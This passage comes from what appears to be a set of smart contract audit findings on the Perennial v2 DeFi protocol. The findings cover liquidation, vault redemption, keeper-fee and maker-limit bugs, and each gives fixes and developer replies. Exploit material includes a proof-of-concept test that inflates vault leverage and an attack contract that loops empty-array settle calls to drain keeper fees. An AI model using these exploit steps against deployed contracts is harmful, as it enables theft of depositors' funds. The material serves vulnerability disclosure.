liquidation. Latest= "" + posLatest.long + "" current = "" + posCurrent.long);\n\n})\n```\n\nCode Snippet\nTool used\nManual Review"чWhen liquidating, order must decrease position:\n```\nif (protected && (\n    !context.closable.isZero() || // @audit even if closable is 0, position can still increase\n    context.latestPosition.local.maintained(\n        context.latestVersion,\n        context.riskParameter,\n        context.pendingCollateral.sub(collateral)\n    ) ||\n-    collateral.lt(Fixed6Lib.from(-1, _liquidationFee(context, newOrder)))\n+    collateral.lt(Fixed6Lib.from(-1, _liquidationFee(context, newOrder))) ||\n+    newOrder.maker.add(newOrder.long).add(newOrder.short).gte(Fixed6Lib.ZERO)\n)) revert MarketInvalidProtectionError();\n```\n\nDiscussion\nkbrizzle\nResolved via: https://github.com/equilibria-xyz/perennial-v2/pull/149.чMalicious liquidator can liquidate users while increasing their position to any value including max possible 2^62-1 ignoring any collateral and position size checks. This is possible on its own, but liquidator can also craft such situation with very high probability. As a result of this action, all users will lose all their funds deposited into Market. For example, fee paid (and accured by makers) from max possible position will exceed total Market collateral balance so that the first maker will be able to withdraw all Market balance, minimal price change will create huge profit for the user, exceeding Market balance (if fee = 0) etc.
Vault leverage can be increased to any value up to min margin requirement due to incorrect `maxRedeem` calculations with closable and `LEVERAGE_BUFFER`чhighч```\nUFixed6 collateral = marketContext.currentPosition.maker\n    .sub(marketContext.currentPosition.net().min(marketContext.currentPosition.maker))  // available maker\n    .min(marketContext.closable.mul(StrategyLib.LEVERAGE_BUFFER))                       // available closable\n    .muldiv(marketContext.latestPrice.abs(), registration.leverage)                     // available collateral\n    .muldiv(totalWeight, registration.weight);                                          // collateral in market\n```\nч"When redeeming from the vault, maximum amount allowed to be redeemed is limited by collateral required to keep the minimum vault position size which will remain open due to different factors, including `closable` value, which is a limitation on how much position can be closed given current pending positions. However, when calclulating max redeemable amount, `closable` value is multiplied by `LEVERAGE_BUFFER` value (currently 1.2):\n```\nUFixed6 collateral = marketContext.currentPosition.maker\n    .sub(marketContext.currentPosition.net().min(marketContext.currentPosition.maker))  // available maker\n    .min(marketContext.closable.mul(StrategyLib.LEVERAGE_BUFFER))                       // available closable\n    .muldiv(marketContext.latestPrice.abs(), registration.leverage)                     // available collateral\n    .muldiv(totalWeight, registration.weight);                                          // collateral in market\n```\n\nThe intention seems to be to allow to withdraw a bit more collateral so that leverage can increase at max by LEVERAGE_BUFFER. However, the math is totally wrong here, for example:\nCurrent position = 12, `closable = 10`\nMax amount allowed to be redeemed is 12 (100% of shares)\nHowever, when all shares are withdrawn, `closable = 10` prevents full position closure, so position will remain at 12-10 = 2\nOnce settled, user can claim all vault collateral while vault still has position of size 2 open. Claiming all collateral will revert due to this line in allocate:\n```\n_locals.marketCollateral = strategy.marketContexts[marketId].margin\n    .add(collateral.sub(_locals.totalMargin).muldiv(registrations[marketId].weight, _locals.totalWeight));\n```\n\nSo the user can claim the assets only if remaining collateral is equal to or is greater than total margin of all markets. This means that user can put the vault into max leverage possible ignoring the vault leverage config (vault will have open position of such size, which will make all vault collateral equal the minimum margin requirement to open such position). This creates a big risk for vault liquidation and loss of funds for vault depositors.\nAs seen from the example above, it's possible to put the vault at high leverage only if user redeems amount higher than `closable` allows (redeem amount in the closable..closable * LEVERAGE_BUFFER range). However, since deposits and redeems from the vault are settled later, it's impossible to directly create such situation (redeemable amount > closable). There is still a way to create such situation indirectly via maker limit limitation.\nScenario:\nMarket config leverage = 4. Existing deposits = $1K. Existing positions in underlying market are worth $4K\nOpen maker position in underlying markets such that `makerLimit - currentMaker = $36K`\nDeposit $11K to the vault (total deposits = $12K). The vault will try to open position of size = $48K (+$44K), however `makerLimit` will not allow to open full position, so the vault will only open +$36K (total position $40K)\nWait until the deposit settles\nClose maker position in underlying markets to free up maker limit\nDeposit minimum amount to the vault from another user. This increases vault positions to $48K (settled = $40K, pending = $48K, `closable` = $40K)\nRedeem $11K from the vault. This is possible, because maxRedeem is `closable/leverage*LEVERAGE_BUFFER` = `$40K/4*1.2` = `$12K`. However, the position will be limited by `closable`, so it will be reduced only by $40K (set to $8K).\nWait until redeem settles\nClaim $11K from the vault. This leaves the vault with the latest position = $8K, but only with $1K of original deposit, meaning vault leverage is now 8 - twice the value specified by config (4).\nThis scenario will keep high vault leverage only for a short time until next oracle version, because `claim` will reduce position back to $4K, however this position reduction can also be avoided, for example, by opening/closing positions to make `long-short = maker` or `short-long = maker` in the underlying market(s), thus disallowing the vault to reduce its maker position and keeping the high leverage.\nThe scenario above is demonstrated in the test, add this to Vault.test.ts:\n```\nit('increase vault leverage', async () => {\n    console.log(""start"");\n\n    async function setOracle(latestTime: BigNumber, currentTime: BigNumber) {\n    await setOracleEth(latestTime, currentTime)\n    await setOracleBtc(latestTime, currentTime)\n    }\n\n    async function setOracleEth(latestTime: BigNumber, currentTime: BigNumber) {\n    const [, currentPrice] = await oracle.latest()\n    const newVersion = {\n        timestamp: latestTime,\n        price: currentPrice,\n        valid: true,\n    }\n    oracle.status.returns([newVersion, currentTime])\n    oracle.request.whenCalledWith(user.address).returns()\n    oracle.latest.returns(newVersion)\n    oracle.current.returns(currentTime)\n    oracle.at.whenCalledWith(newVersion.timestamp).returns(newVersion)\n    }\n\n    async function setOracleBtc(latestTime: BigNumber, currentTime: BigNumber) {\n    const [, currentPrice] = await btcOracle.latest()\n    const newVersion = {\n        timestamp: latestTime,\n        price: currentPrice,\n        valid: true,\n    }\n    btcOracle.status.returns([newVersion, currentTime])\n    btcOracle.request.whenCalledWith(user.address).returns()\n    btcOracle.latest.returns(newVersion)\n    btcOracle.current.returns(currentTime)\n    btcOracle.at.whenCalledWith(newVersion.timestamp).returns(newVersion)\n    }\n\n    async function logLeverage() {\n    // vault collateral\n    var vaultCollateralEth = (await market.locals(vault.address)).collateral\n    var vaultCollateralBtc = (await btcMarket.locals(vault.address)).collateral\n    var vaultCollateral = vaultCollateralEth.add(vaultCollateralBtc)\n\n    // vault position\n    var vaultPosEth = (await market.positions(vault.address)).maker;\n    var ethPrice = (await oracle.latest()).price;\n    var vaultPosEthUsd = vaultPosEth.mul(ethPrice);\n    var vaultPosBtc = (await btcMarket.positions(vault.address)).maker;\n    var btcPrice = (await btcOracle.latest()).price;\n    var vaultPosBtcUsd = vaultPosBtc.mul(btcPrice);\n    var vaultPos = vaultPosEthUsd.add(vaultPosBtcUsd);\n    var leverage = vaultPos.div(vaultCollateral);\n    console.log(""Vault collateral = "" + vaultCollateral.div(1e6) + "" pos = "" + vaultPos.div(1e12) + "" leverage = "" + leverage);\n    }\n\n    await setOracle(STARTING_TIMESTAMP.add(3600), STARTING_TIMESTAMP.add(3700))\n    await vault.settle(user.address);\n\n    // put markets at the (limit - 5000) each\n    var makerLimit = (await market.riskParameter()).makerLimit;\n    var makerCurrent = (await market.position()).maker;\n    var maker = makerLimit;\n    var ethPrice = (await oracle.latest()).price;\n    var availUsd = parse6decimal('32000'); // 10/2 * 4\n    var availToken = availUsd.mul(1e6).div(ethPrice);\n    maker = maker.sub(availToken);\n    var makerBefore = makerCurrent;// (await market.positions(user.address)).maker;\n    console.log(""ETH Limit = "" + makerLimit + "" CurrentGlobal = "" + makerCurrent + "" CurrentUser = "" + makerBefore + "" price = "" + ethPrice + "" availToken = "" + availToken + "" maker = "" + maker);\n    for (var i = 0; i < 5; i++)\n        await fundWallet(asset, user);\n    await market.connect(user).update(user.address, maker, 0, 0, parse6decimal('1000000'), false)\n\n    var makerLimit = (await btcMarket.riskParameter()).makerLimit;\n    var makerCurrent = (await btcMarket.position()).maker;\n    var maker = makerLimit;\n    var btcPrice = (await btcOracle.latest()).price;\n    var availUsd = parse6decimal('8000'); // 10/2 * 4\n    var availToken = availUsd.mul(1e6).div(btcPrice);\n    maker = maker.sub(availToken);\n    var makerBeforeBtc = makerCurrent;// (await market.positions(user.address)).maker;\n    console.log(""BTC Limit = "" + makerLimit + "" CurrentGlobal = "" + makerCurrent + "" CurrentUser = "" + makerBeforeBtc + "" price = "" + btcPrice + "" availToken = "" + availToken + "" maker = "" + maker);\n    for (var i = 0; i < 10; i++)\n        await fundWallet(asset, btcUser1);\n    await btcMarket.connect(btcUser1).update(btcUser1.address, maker, 0, 0, parse6decimal('2000000'), false)\n\n    console.log(""market updated"");\n\n    var deposit = parse6decimal('12000')\n    await vault.connect(user).update(user.address, deposit, 0, 0)\n\n    await setOracle(STARTING_TIMESTAMP.add(3700), STARTING_TIMESTAMP.add(3800))\n    await vault.settle(user.address)\n\n    await logLeverage();\n\n    // withdraw the blocking amount\n    console.log(""reduce maker blocking position to allow vault maker increase"")\n    await market.connect(user).update(user.address, makerBefore, 0, 0, 0, false);\n    await btcMarket.connect(btcUser1).update(btcUser1.address, makerBeforeBtc, 0, 0, 0, false);\n\n    await setOracle(STARTING_TIMESTAMP.add(3800), STARTING_TIMESTAMP.add(3900))\n\n    // refresh vault to increase position size since it's not held now\n    var deposit = parse6decimal('10')\n    console.log(""Deposit small amount to increase position"")\n    await vault.connect(user2).update(user2.address, deposit, 0, 0)\n\n    // now redeem 11000 (which is allowed, but market position will be 2000 due to closable)\n    var redeem = parse6decimal('11500')\n    console.log(""Redeeming 11500"")\n    await vault.connect(user).update(user.address, 0, redeem, 0);\n\n    // settle all changes\n    await setOracle(STARTING_TIMESTAMP.add(3900), STARTING_TIMESTAMP.add(4000))\n    await vault.settle(user.address)\n    await logLeverage();\n\n    // claim those assets we've withdrawn\n    var claim = parse6decimal('11100')\n    console.log(""Claiming 11100"")\n    await vault.connect(user).update(user.address, 0, 0, claim);\n\n    await logLeverage();\n})\n```\n\nConsole log from execution of the code above:\n```\nstart\nETH Limit = 1000000000 CurrentGlobal = 200000000 CurrentUser = 200000000 price = 2620237388 availToken = 12212633 maker = 987787367\nBTC Limit = 100000000 CurrentGlobal = 20000000 CurrentUser = 20000000 price = 38838362695 availToken = 205981 maker = 99794019\nmarket updated\nVault collateral = 12000 pos = 39999 leverage = 3333330\nreduce maker blocking position to allow vault maker increase\nDeposit small amount to increase position\nRedeeming 11500\nVault collateral = 12010 pos = 8040 leverage = 669444\nClaiming 11100\nVault collateral = 910 pos = 8040 leverage = 8835153\n```\n\nCode Snippet\nThe difference in these values allows to keep high position while withdrawing more collateral than needed to target leverage.\nTool used\nManual Review"чThe formula to allow LEVERAGE_BUFFER should apply it to final position size, not to delta position size (maxRedeem returns delta to subtract from current position). Currently redeem amount it limited by: `closable * LEVERAGE_BUFFER`. Once subtracted from the current position size, we obtain:\n`maxRedeem = closable * LEVERAGE_BUFFER / leverage`\n`newPosition = currentPosition - closable`\n`newCollateral = (currentPosition - closable * LEVERAGE_BUFFER) / leverage`\n`newLeverage = newPosition / newCollateral = leverage * (currentPosition - closable) / (currentPosition - closable * LEVERAGE_BUFFER)`\n`= leverage / (1 - (LEVERAGE_BUFFER - 1) * closable / (currentPosition - closable))`\nAs can be seen, the new leverage can be any amount and the formula doesn't make much sense, it certainly doesn't limit new leverage factor to LEVERAGE_BUFFER (denominator can be 0, negative or any small value, meaning leverage can be any number as high as you want). I think what developers wanted, is to have:\n`newPosition = currentPosition - closable`\n`newCollateral = newPosition / (leverage * LEVERAGE_BUFFER)`\n`newLeverage = newPosition / (newPosition / (leverage * LEVERAGE_BUFFER)) = leverage * LEVERAGE_BUFFER`\nNow, the important part to understand is that it's impossible to calculate delta collateral simply from delta position like it is now. When we know target newPosition, we can calculate target newCollateral, and then maxRedeem (delta collateral) can be calculated as currentCollateral - newCollateral:\n`maxRedeem = currentCollateral - newCollateral`\n`maxRedeem = currentCollateral - newPosition / (leverage * LEVERAGE_BUFFER)`\nSo the fixed collateral calculation can be something like that:\n```\nUFixed6 deltaPosition = marketContext.currentPosition.maker\n    .sub(marketContext.currentPosition.net().min(marketContext.currentPosition.maker))  // available maker\n    .min(marketContext.closable);\nUFixed6 targetPosition = marketContext.currentAccountPosition.maker.sub(deltaPosition); // expected ideal position\nUFixed6 targetCollateral = targetPosition.muldiv(marketContext.latestPrice.abs(), \n    registration.leverage.mul(StrategyLib.LEVERAGE_BUFFER));                            // allow leverage to be higher by LEVERAGE_BUFFER\nUFixed6 collateral = marketContext.local.collateral.sub(targetCollateral)               // delta collateral\n    .muldiv(totalWeight, registration.weight);                                          // market collateral => vault collateral\n```\n\nDiscussion\nkbrizzle\nThis was patched in our v2.0 deployment via https://github.com/equilibria-xyz/perennial-v2/pull/156.\nWe will follow up with the v2.1 fix as well, since it's materially different.чMalicious user can put the vault at very high leverage, breaking important protocol invariant (leverage not exceeding target market leverage) and exposing the users to much higher potential funds loss / risk from the price movement due to high leverage and very high risk of vault liquidation, causing additional loss of funds from liquidation penalties and position re-opening fees.
Vault max redeem calculations limit redeem amount to the smallest position size in underlying markets which can lead to very small max redeem amount even with huge TVL vaultчhighч```\nUFixed6 collateral = marketContext.currentPosition.maker\n    .sub(marketContext.currentPosition.net().min(marketContext.currentPosition.maker))  // available maker\n    .min(marketContext.closable.mul(StrategyLib.LEVERAGE_BUFFER))                       // available closable\n    .muldiv(marketContext.latestPrice.abs(), registration.leverage)                     // available collateral\n    .muldiv(totalWeight, registration.weight);                                          // collateral in market\n\nredemptionAssets = redemptionAssets.min(collateral);\n```\nчWhen redeeming from the vault, maximum amount allowed to be redeemed is limited by current opened position in each underlying market (the smallest opened position adjusted for weight). However, if any one market has its maker close to maker limit, the vault will open very small position, limited by maker limit. But now all redeems will be limited by this very small position for no reason: when almost any amount is redeemed, the vault will attempt to increase (not decrease) position in such market, so there is no sense in limiting redeem amount to the smallest position.\nThis issue can create huge problems for users with large deposits. For example, if the user has deposited $10M to the vault, but due to one of the underlying markets the max redeem amount is only $1, user will need to do 10M transactions to redeem his full amount (which will not make sense due to gas).\nVault's `maxRedeem` is calculated for each market as:\n```\nUFixed6 collateral = marketContext.currentPosition.maker\n    .sub(marketContext.currentPosition.net().min(marketContext.currentPosition.maker))  // available maker\n    .min(marketContext.closable.mul(StrategyLib.LEVERAGE_BUFFER))                       // available closable\n    .muldiv(marketContext.latestPrice.abs(), registration.leverage)                     // available collateral\n    .muldiv(totalWeight, registration.weight);                                          // collateral in market\n\nredemptionAssets = redemptionAssets.min(collateral);\n```\n\n`closable` is limited by the vault's settled and current positions in the market. As can be seen from the calculation, redeem amount is limited by vault's position in the market. However, if the position is far from target due to different market limitations, this doesn't make much sense. For example, if vault has $2M deposts and there are 2 underlying markets, each with weight 1, and:\nIn Market1 vault position is worth $1 (target position = $1M)\nIn Market2 vault position is worth $1M (target position = $1M)\nThe `maxRedeem` will be limited to $1, even though redeeming any amount up to $999999 will only make the vault attempt to increase position in Market1 rather than decrease.\nThere is also an opposite situation possible, when current position is higher than target position (due to LEVERAGE_BUFFER). This will make maxredeem too high. For example, similar example to previous, but:\nIn Market1 vault position is worth $1.2M (target position = $1M)\nIn Market2 vault position is worth $1.2M (target position = $1M)\nThe `maxRedeem` will be limited to $1.44M (due to LEVERAGE_BUFFER), without even comparing the current collateral (which is just $1M per market), based only on position size.чConsider calculating max redeem by comparing target position vs current position and then target collateral vs current collateral instead of using only current position for calculations. This might be somewhat complex, because it will require to re-calculate allocation amounts to compare target vs current position. Possibly max redeem should not be limited as a separate check, but rather as part of the `allocate()` calculations (reverting if the actual leverage is too high in the end)чWhen vault's position is small in any underlying market due to maker limit, the max redeem amount in the vault will be very small, which will force users with large deposits to use a lot of transactions to redeem it (they'll lose funds to gas) or it might even be next to impossible to do at all (if, for example, user has a deposit of $10M and max redeem = $1), in such case the redeems are basically broken and not possible to do.\nCode Snippet\nTool used\nManual Review
Attacker can call `KeeperFactory#settle` with empty arrays as input parameters to steal all keeper feesчhighч"```\nfunction settle(bytes32[] memory ids, IMarket[] memory markets, uint256[] memory versions, uint256[] memory maxCounts)\n    external\n    keep(settleKeepConfig(), msg.data, 0, """")\n{\n    if (\n        ids.length != markets.length ||\n        ids.length != versions.length ||\n        ids.length != maxCounts.length ||\n        // Prevent calldata stuffing\n        abi.encodeCall(KeeperFactory.settle, (ids, markets, versions, maxCounts)).length != msg.data.length\n    )\n        revert KeeperFactoryInvalidSettleError();\n\n    for (uint256 i; i < ids.length; i++)\n        IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i], maxCounts[i]);\n}\n```\n"ч"Anyone can call `KeeperFactory#request`, inputting empty arrays as parameters, and the call will succeed, and the caller receives a fee.\nAttacker can perform this attack many times within a loop to steal ALL keeper fees from protocol.\nExpected Workflow:\nUser calls `Market#update` to open a new position\nMarket calls `Oracle#request` to request a new oracleVersion\nThe User's account gets added to a callback array of the market\nOnce new oracleVersion gets committed, keepers can call `KeeperFactory#settle`, which will call `Market#update` on accounts in the Market's callback array, and pay the keeper(i.e. caller) a fee.\n`KeeperFactory#settle` call will fail if there is no account to settle(i.e. if callback array is empty)\nAfter settleing an account, it gets removed from the callback array\nThe issue:\nHere is KeeperFactory#settle function:\n```\nfunction settle(bytes32[] memory ids, IMarket[] memory markets, uint256[] memory versions, uint256[] memory maxCounts)\n    external\n    keep(settleKeepConfig(), msg.data, 0, """")\n{\n    if (\n        ids.length != markets.length ||\n        ids.length != versions.length ||\n        ids.length != maxCounts.length ||\n        // Prevent calldata stuffing\n        abi.encodeCall(KeeperFactory.settle, (ids, markets, versions, maxCounts)).length != msg.data.length\n    )\n        revert KeeperFactoryInvalidSettleError();\n\n    for (uint256 i; i < ids.length; i++)\n        IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i], maxCounts[i]);\n}\n```\n\nAs we can see, function does not check if the length of the array is 0, so if user inputs empty array, the for loop will not be entered, but the keeper still receives a fee via the `keep` modifier.\nAttacker can have a contract perform the attack multiple times in a loop to drain all fees:\n```\ninterface IKeeperFactory{\n    function settle(bytes32[] memory ids,IMarket[] memory markets,uint256[] memory versions,uint256[] memory maxCounts\n    ) external;\n}\n\ninterface IMarket(\n    function update()external;\n)\n\ncontract AttackContract{\n\n    address public attacker;\n    address public keeperFactory;\n    IERC20 public keeperToken;\n\n    constructor(address perennialDeployedKeeperFactory, IERC20 _keeperToken){\n        attacker=msg.sender;\n        keeperFactory=perennialDeployedKeeperFactory;\n        keeperToken=_keeperToken;\n    }\n\n    function attack()external{\n        require(msg.sender==attacker,""not allowed"");\n\n        bool canSteal=true;\n\n        // empty arrays as parameters\n        bytes32[] memory ids=[];\n        IMarket[] memory markets=[];\n        uint256[] versions=[];\n        uint256[] maxCounts=[];\n\n        // perform attack in a loop till all funds are drained or call reverts\n        while(canSteal){\n            try IKeeperFactory(keeperFactory).settle(ids,markets,versions,maxCounts){\n                //\n            }catch{\n                canSteal=false;\n            }\n        }\n        keeperToken.transfer(msg.sender, keeperToken.balanceOf(address(this)));\n    }\n}\n```\n"ч"Within KeeperFactory#settle function, revert if ids.length==0:\n```\nfunction settle(\n    bytes32[] memory ids,\n    IMarket[] memory markets,\n    uint256[] memory versions,\n    uint256[] memory maxCounts\n)external keep(settleKeepConfig(), msg.data, 0, """") {\n    if (\n++++    ids.length==0 ||\n        ids.length != markets.length ||\n        ids.length != versions.length ||\n        ids.length != maxCounts.length ||\n        // Prevent calldata stuffing\n        abi.encodeCall(KeeperFactory.settle, (ids, markets, versions, maxCounts)).length != msg.data.length\n    ) revert KeeperFactoryInvalidSettleError();\n\n    for (uint256 i; i < ids.length; i++)\n        IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i], maxCounts[i]);\n}\n```\n\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\npanprog commented:\nmedium, dup of #9\narjun-io\nWe might consider this a High due to the fact that draining the oracle fee could brick markets pretty quickly (potentially in 1 tx)"чAll keeper fees can be stolen from protocol, and there will be no way to incentivize Keepers to commitRequested oracle version, and other keeper tasks\nCode Snippet\nTool used\nManual Review
MultiInvoker doesn't pay keepers refund for l1 calldataчmediumч```\n    modifier keep(\n        KeepConfig memory config,\n        bytes calldata applicableCalldata,\n        uint256 applicableValue,\n        bytes memory data\n    ) {\n        uint256 startGas = gasleft();\n\n\n        _;\n\n\n        uint256 applicableGas = startGas - gasleft();\n        (UFixed18 baseFee, UFixed18 calldataFee) = (\n            _baseFee(applicableGas, config.multiplierBase, config.bufferBase),\n            _calldataFee(applicableCalldata, config.multiplierCalldata, config.bufferCalldata)\n        );\n\n\n        UFixed18 keeperFee = UFixed18.wrap(applicableValue).add(baseFee).add(calldataFee).mul(_etherPrice());\n        _raiseKeeperFee(keeperFee, data);\n        keeperToken().push(msg.sender, keeperFee);\n\n\n        emit KeeperCall(msg.sender, applicableGas, applicableValue, baseFee, calldataFee, keeperFee);\n    }\n```\nчMultiInvoker doesn't pay keepers refund for l1 calldata, as result keepers can be not incentivized to execute orders.\nMultiInvoker contract allows users to create orders, which then can be executed by keepers. For his job, keeper receives fee from order's creator. This fee payment is handled by `_handleKeep` function.\nThe function will call `keep` modifier and will craft `KeepConfig` which contains `keepBufferCalldata`, which is flat fee for l1 calldata of this call.\n```\n    modifier keep(\n        KeepConfig memory config,\n        bytes calldata applicableCalldata,\n        uint256 applicableValue,\n        bytes memory data\n    ) {\n        uint256 startGas = gasleft();\n\n\n        _;\n\n\n        uint256 applicableGas = startGas - gasleft();\n        (UFixed18 baseFee, UFixed18 calldataFee) = (\n            _baseFee(applicableGas, config.multiplierBase, config.bufferBase),\n            _calldataFee(applicableCalldata, config.multiplierCalldata, config.bufferCalldata)\n        );\n\n\n        UFixed18 keeperFee = UFixed18.wrap(applicableValue).add(baseFee).add(calldataFee).mul(_etherPrice());\n        _raiseKeeperFee(keeperFee, data);\n        keeperToken().push(msg.sender, keeperFee);\n\n\n        emit KeeperCall(msg.sender, applicableGas, applicableValue, baseFee, calldataFee, keeperFee);\n    }\n```\n\nThis modifier should calculate amount of tokens that should be refunded to user and then raise it. We are interested not in whole modifier, but in calldata handling. To do that we call `_calldataFee` function. This function does nothing in the `Kept` contract and is overrided in the `Kept_Arbitrum` and `Kept_Optimism`.\nThe problem is that MultiInvoker is only one and it just extends `Keept`. As result his `_calldataFee` function will always return 0, which means that calldata fee will not be added to the refund of keeper.ч"You need to implement 2 versions of MultiInvoker: for optimism(Kept_Optimism) and arbitrum(Kept_Arbitrum).\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\npanprog commented:\ninvalid, I believe this is by design, the payment for order execution is fixed at the time of order placement and is paid by the user, so there is no point in calculating the calldata fee\nkbrizzle\nThis is actually valid and something we've recently patched in our live v2.0 deployment (here).\nThe supplied fee in the trigger order is only a ""max fee"", but the paid out fee is calculated at time of execution."чKeeper will not be incentivized to execute orders.\nCode Snippet\nProvided above\nTool used\nManual Review
It is possible to open and liquidate your own position in 1 transaction to overcome efficiency and liquidity removal limits at almost no costчmediumч```\nif (\n    !context.currentPosition.local.margined(context.latestVersion, context.riskParameter, context.pendingCollateral)\n) revert MarketInsufficientMarginError();\n```\nчIn 2.0 audit the issue 104 was fixed but not fully and it's still possible, in a slightly different way. This wasn't found in the fix review contest. The fix introduced margined and maintained amounts, so that margined amount is higher than maintained one. However, when collateral is withdrawn, only the current (pending) position is checked by margined amount, the largest position (including latest settled) is checked by maintained amount. This still allows to withdraw funds up to the edge of being liquidated, if margined current position amount <= maintained settled position amount. So the new way to liquidate your own position is to reduce your position and then do the same as in 2.0 issue.\nThis means that it's possible to be at almost liquidation level intentionally and moreover, the current oracle setup allows to open and immediately liquidate your own position in 1 transaction, effectively bypassing efficiency and liquidity removal limits, paying only the keeper (and possible position open/close) fees, causing all kinds of malicious activity which can harm the protocol.\n`Market._invariant` verifies margined amount only for the current position:\n```\nif (\n    !context.currentPosition.local.margined(context.latestVersion, context.riskParameter, context.pendingCollateral)\n) revert MarketInsufficientMarginError();\n```\n\nAll the other checks (max pending position, including settled amount) are for maintained amount:\n```\nif (\n    !PositionLib.maintained(context.maxPendingMagnitude, context.latestVersion, context.riskParameter, context.pendingCollateral)\n) revert MarketInsufficientMaintenanceError();\n```\n\nThe user can liquidate his own position with 100% guarantee in 1 transaction by following these steps:\nIt can be done only on existing settled position\nRecord Pyth oracle prices with signatures until you encounter a price which is higher (or lower, depending on your position direction) than latest oracle version price by any amount.\nIn 1 transaction do the following: 3.1. Reduce your position by `(margin / maintenance)` and make the position you want to liquidate at exactly the edge of liquidation: withdraw maximum allowed amount. Position reduction makes margined(current position) = maintained(settled position), so it's possible to withdraw up to be at the edge of liquidation. 3.2. Commit non-requested oracle version with the price recorded earlier (this price makes the position liquidatable) 3.3. Liquidate your position (it will be allowed, because the position generates a minimum loss due to price change and becomes liquidatable)\nSince all liquidation fee is given to user himself, liquidation of own position is almost free for the user (only the keeper and position open/close fee is paid if any).чIf collateral is withdrawn or order increases position, verify `maxPendingMagnitude` with `margined` amount. If position is reduced or remains unchanged AND collateral is not withdrawn, only then `maxPendingMagnitude` can be verified with `maintained` amount.чThere are different malicious actions scenarios possible which can abuse this issue and overcome efficiency and liquidity removal limitations (as they're ignored when liquidating positions), such as:\nCombine with the other issues for more severe effect to be able to abuse them in 1 transaction (for example, make `closable = 0` and liquidate your position while increasing to max position size of 2^62-1 - all in 1 transaction)\nOpen large maker and long or short position, then liquidate maker to cause mismatch between long/short and maker (socialize positions). This will cause some chaos in the market, disbalance between long and short profit/loss and users will probably start leaving such chaotic market, so while this attack is not totally free, it's cheap enough to drive users away from competition.\nOpen large maker, wait for long and/or short positions from normal users to accumulate, then liquidate most of the large maker position, which will drive taker interest very high and remaining small maker position will be able to accumulate big profit with a small risk.\nCode Snippet\nTool used\nManual Review
Invalid oracle version can cause the `maker` position to exceed `makerLimit`, temporarily or permanently bricking the Market contractчmediumч```\nif (context.currentPosition.global.maker.gt(context.riskParameter.makerLimit))\n    revert MarketMakerOverLimitError();\n```\nчWhen invalid oracle version happens, positions pending at the oracle version are invalidated with the following pending positions increasing or decreasing in size. When this happens, all position limit checks are not applied (and can't be cancelled/modified), but they are still verified for the final positions in _invariant. This means that many checks are bypassed during such event. There is a protection against underflow due to this problem by enforcing the calculated `closable` value to be 0 or higher. However, exactly the same problem can happen with overflow and there is no protection against it.\nFor example:\nLatest global maker = maker limit = 1000\nPending global maker = 500 [t=100]\nPending global maker = 1000 [t=200]\nIf oracle version at t = 100 is invalid, then pending global maker = 1500 (at t = 200). However, due to this check in _invariant:\n```\nif (context.currentPosition.global.maker.gt(context.riskParameter.makerLimit))\n    revert MarketMakerOverLimitError();\n```\n\nall Market updates will revert except update to reduce maker position by 500+, which might not be even possible in 1 update depending on maker distribution between users. For example, if 5 users have maker = 300 (1500 total), then no single user can update to reduce maker by 500. This will temporarily brick Market (all updates will revert) until coordinator increases maker limit. If the limit is already close to max possible (2^62-1), then the contract will be bricked permanently (all updates will revert regardless of maker limit, because global maker will exceed 2^62-1 in calculations and will revert when trying to store it).\nThe same issue can also cause the other problems, such as:\nBypassing the market utilization limit if long/short is increased above maker\nUser unexpectedly becomes liquidatable with too high position (for example: position 500 -> pending 0 -> pending 500 - will make current = 1000 if middle oracle version is invalid)чThe same issue for underflow is already resolved by using `closable` and enforcing such pending positions that no invalid oracle can cause the position to be less than 0. This issue can be resolved in the same way, by introducing some `opeanable` value (calculated similar to `closable`, but in reverse - when position is increased, it's increased, when position is decreased, it doesn't change) and enforcing different limits, such that settled position + openable:\ncan not exceed the max maker\ncan not break utilization\nfor local position - calculate maxMagnitude amount from `settled + local openable` instead of absolute pending position values for margined/maintained calculations.\nDiscussion\nkbrizzle\nInvariant bricking issue resolved via: https://github.com/equilibria-xyz/perennial-v2/pull/155.\nMargin using the incorrect maximum pending position resolved by: https://github.com/equilibria-xyz/perennial-v2/pull/168.\nWe chose to not fix the incorrect maximum `makerLimit` issue due to the complexity involved in implementing the above pending open calculation on the global pending positions compared to its relatively low severity since the error on the limit is capped. We will make a note of this property for parameter tuning, especially for markets with expected invalid versions.чIf current maker is close to maker limit, and some user(s) reduce their maker then immediately increase back, and the oracle version is invalid, maker will be above the maker limit and the Market will be temporarily bricked until coordinator increases the maker limit. Even though it's temporary, it still bricked for some time and coordinator is forced to increase maker limit, breaking the intended market config. Furthermore, once the maker limit is increased, there is no guarantee that the users will reduce it so that the limit can be reduced back.\nAlso, for some low-price tokens, the maker limit can be close to max possible value (2^62-1 is about `4*1e18` or Fixed6(4*1e12)). If the token price is about $0.00001, this means such maker limit allows `$4*1e7` or $40M. So, if low-value token with $40M maker limit is used, this issue will lead to maker overflow 2^62-1 and bricking the Market permanently, with all users being unable to withdraw their funds, losing everything.\nWhile this situation is not very likely, it's well possible. For example, if the maker is close to limit, any maker reducing the position will have some other user immediately take up the freed up maker space, so things like global maker change of: 1000->900->1000 are easily possible and any invalid oracle version will likely cause the maker overflowing the limit.\nCode Snippet\nTool used\nManual Review
`KeeperOracle.request` adds only the first pair of market+account addresses per oracle version to callback list, ignoring all the subsequent onesчmediumч```\n/// @dev Mapping from version to a set of registered markets for settlement callback\nmapping(uint256 => EnumerableSet.AddressSet) private _globalCallbacks;\n\n/// @dev Mapping from version and market to a set of registered accounts for settlement callback\nmapping(uint256 => mapping(IMarket => EnumerableSet.AddressSet)) private _localCallbacks;\n```\nчThe new feature introduced in 2.1 is the callback called for all markets and market+account pairs which requested the oracle version. These callbacks are called once the corresponding oracle settles. For this reason, `KeeperOracle` keeps a list of markets and market+account pairs per oracle version to call market.update on them:\n```\n/// @dev Mapping from version to a set of registered markets for settlement callback\nmapping(uint256 => EnumerableSet.AddressSet) private _globalCallbacks;\n\n/// @dev Mapping from version and market to a set of registered accounts for settlement callback\nmapping(uint256 => mapping(IMarket => EnumerableSet.AddressSet)) private _localCallbacks;\n```\n\nHowever, currently `KeeperOracle` stores only the market+account from the first request call per oracle version, because if the request was already made, it returns from the function before adding to the list:\n```\nfunction request(IMarket market, address account) external onlyAuthorized {\n    uint256 currentTimestamp = current();\n@@@ if (versions[_global.currentIndex] == 